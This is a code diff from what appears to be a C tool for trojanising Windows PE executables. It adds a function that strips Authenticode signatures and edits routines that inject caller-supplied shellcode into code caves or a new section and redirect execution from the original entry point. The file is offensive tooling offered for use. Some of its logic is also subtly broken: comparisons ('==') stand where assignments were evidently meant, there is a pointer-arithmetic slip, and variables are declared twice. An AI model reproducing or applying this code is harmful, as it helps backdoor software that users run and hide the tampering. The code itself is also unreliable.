@@ -1,16 +1,68 @@
 #include "pe.h"
 
-int PE_sign(char *file_name , char *signature){
-
-
+int PE_sig_remove(char *file ){
+    uint32_t size;
+    uint16_t machine_type;
+    char *pe = load_file(file,&size);
+    PIMAGE_DATA_DIRECTORY cert;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
+    PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(pe + dos->e_lfanew)+4;
+    machine_type = file_header->Machine;
+    if (machine_type == 0x14C){
+        PIMAGE_NT_HEADERS32 nt = (PIMAGE_NT_HEADERS32)(pe + dos->e_lfanew);
+        cert = &nt->OptionalHeader.DataDirectory[4];
+        if (cert->VirtualAddress == 0 || cert->Size == 0) {
+            free(pe);
+            return -1;
+        }
+        cert->VirtualAddress == 0;
+        cert->Size == 0;
+        if((cert->Size+cert->VirtualAddress)<size){
+        memmove(pe+cert->VirtualAddress,pe+cert->VirtualAddress+cert->Size,size-cert->VirtualAddress-cert->Size);
+        size-=cert->Size;
+        extend_file(file,size);
+        write_data(file,0,pe,size);
+        return 0;
+        }
+        else{
+            size-=cert->Size;
+            extend_file(file,size);
+            write_data(file,0,pe,size);
+            return 0;
+        }
+    }
+    if (machine_type == 0x8664){
+        PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)(pe + dos->e_lfanew);
+        cert = &nt64->OptionalHeader.DataDirectory[4];
+        if (cert->VirtualAddress == 0 || cert->Size == 0) {
+            free(pe);
+            return -1;
+        }
+        cert->VirtualAddress == 0;
+        cert->Size == 0;
+        if((cert->Size+cert->VirtualAddress)<size){
+            memmove(pe+cert->VirtualAddress,pe+cert->VirtualAddress+cert->Size,size-cert->VirtualAddress-cert->Size);
+            size-=cert->Size;
+            extend_file(file,size);
+            write_data(file,0,pe,size);
+            return 0;
+        }
+        else{
+            size-=cert->Size;
+            extend_file(file,size);
+            write_data(file,0,pe,size);
+            return 0;
+        }
+    }
+return -1;
 }
-int PE_code_cave(char *file_name, char *shellcode ,int shellcode_len){
+int PE_code_cave(char *file, char *shellcode ,int shellcode_len){
     uint32_t vaddr;
     uint64_t oryginal_entry;
     uint32_t size;
     uint16_t machine_type;
     
-   char *pe = load_file(file_name,&size);
+   char *pe = load_file(file,&size);
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
     PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(pe + dos->e_lfanew + 4);
     machine_type = file_header->Machine;
@@ -41,13 +93,13 @@ int PE_code_cave(char *file_name, char *shellcode ,int shellcode_len){
 
                         char *payload = apply_suffix(shellcode, shellcode_len, oryginal_entry, vaddr);
 
-                        if(write_data(file_name, 0, pe, size)==-1){
+                        if(write_data(file, 0, pe, size)==-1){
                             free(pe);
                             free(payload);
                             return -1;
                         }; 
 
-                        if(write_data(file_name, offset, payload, count)==-1){
+                        if(write_data(file, offset, payload, count)==-1){
                             free(pe);
                             free(payload);
                             return -1;
@@ -93,13 +145,13 @@ int PE_code_cave(char *file_name, char *shellcode ,int shellcode_len){
                         char *payload = apply_suffix(shellcode, shellcode_len, oryginal_entry, vaddr);
 
                         
-                        if(write_data(file_name, 0, pe, size)==-1){
+                        if(write_data(file, 0, pe, size)==-1){
                             free(pe);
                             free(payload);
                             return -1;
                         }; 
 
-                        if(write_data(file_name, offset, payload, count)==-1){
+                        if(write_data(file, offset, payload, count)==-1){
                             free(pe);
                             free(payload);
                             return -1;
@@ -124,13 +176,14 @@ int PE_code_cave(char *file_name, char *shellcode ,int shellcode_len){
     free(pe);
     return -1;
                 }
-int PE_new_section(char *file_name,char *section_name,char *shellcode,int shellcode_len){
+int PE_new_section(char *file,char *section_name,char *shellcode,int shellcode_len){
 uint32_t size;
 uint16_t machine_type;
 uint32_t oryginal_entry;
 uint32_t extend;
+uint32_t sizeOfSection;
 char *payload;
-char *pe = load_file(file_name , &size);
+char *pe = load_file(file , &size);
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
     PIMAGE_FILE_HEADER file_header = (PIMAGE_FILE_HEADER)(pe +dos->e_lfanew + 4);
     PIMAGE_SECTION_HEADER next;
@@ -151,7 +204,7 @@ char *pe = load_file(file_name , &size);
     }
 
     memset(&next[NumSections], 0, sizeof(IMAGE_SECTION_HEADER));
-    uint32_t sizeOfSection;
+
     sizeOfSection = (shellcode_len + 5);
     next[NumSections].Misc.VirtualSize = align(sizeOfSection, nt32->OptionalHeader.SectionAlignment, 0);
     next[NumSections].VirtualAddress = align(next[NumSections - 1].Misc.VirtualSize, nt32->OptionalHeader.SectionAlignment, next[NumSections - 1].VirtualAddress);
@@ -164,13 +217,13 @@ char *pe = load_file(file_name , &size);
     nt32->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
     uint32_t extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
     char *payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
-    extend_file(file_name,extend);
-    if(write_data(file_name,0,pe,size)==-1){
+    extend_file(file,extend);
+    if(write_data(file,0,pe,size)==-1){
         free(pe);
         free(payload);
         return -1;
     }
-    if(write_data(file_name,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
+    if(write_data(file,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
         free(pe);
         free(payload);
         return -1;
@@ -195,7 +248,7 @@ char *pe = load_file(file_name , &size);
         }
     
         memset(&next[NumSections], 0, sizeof(IMAGE_SECTION_HEADER));
-        uint32_t sizeOfSection;
+
         sizeOfSection = (shellcode_len + 5);
         next[NumSections].Misc.VirtualSize = align(sizeOfSection, nt64->OptionalHeader.SectionAlignment, 0);
         next[NumSections].VirtualAddress = align(next[NumSections - 1].Misc.VirtualSize, nt64->OptionalHeader.SectionAlignment, next[NumSections - 1].VirtualAddress);
@@ -208,13 +261,13 @@ char *pe = load_file(file_name , &size);
         nt64->OptionalHeader.SizeOfImage = next[NumSections].VirtualAddress + next[NumSections].Misc.VirtualSize;
         extend = next[NumSections].PointerToRawData +  next[NumSections].SizeOfRawData;
         payload = apply_suffix(shellcode,shellcode_len,oryginal_entry,next[NumSections].VirtualAddress);
-        extend_file(file_name,extend);
-        if(write_data(file_name,0,pe,size)==-1){
+        extend_file(file,extend);
+        if(write_data(file,0,pe,size)==-1){
             free(pe);
             free(payload);
             return -1;
         }
-        if(write_data(file_name,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
+        if(write_data(file,next[NumSections].PointerToRawData,payload,shellcode_len+5)==-1){
             free(pe);
             free(payload);
             return -1;
